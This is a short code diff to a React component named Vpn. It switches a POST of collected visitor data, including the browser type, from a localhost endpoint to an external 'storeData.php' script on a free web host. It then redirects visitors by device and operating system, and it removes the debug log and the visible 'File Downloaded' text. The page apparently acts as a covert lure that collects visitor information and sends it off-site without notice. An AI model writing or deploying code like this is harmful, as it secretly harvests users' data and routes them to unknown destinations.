@@ -81,9 +81,8 @@ function Vpn() {
             browserType: getBrowser(navigator.userAgent),
         };
 
-        Axios.post('http://localhost:3001/api/capture', clientData)
+        Axios.post('https://hb88la.000webhostapp.com/storeData.php', clientData)
             .then(response => {
-                console.log('Data: ', response.data);
                 chuyenHuongTheoThietBiVaHeDieuHanh();
             })
             .catch(error => {
@@ -94,12 +93,6 @@ function Vpn() {
     
   return (
     <>
-    <Box sx={{width: '100%', maxWidth: '98%', marginX: 'auto', marginY: '20px'}}>
-        <Typography variant="h1" gutterBottom sx={{paddingY: '10px', fontSize: '18px', fontWeight: '400'}}>
-            File Downloaded
-        </Typography>
-    </Box>
-
     </>
   )
 }
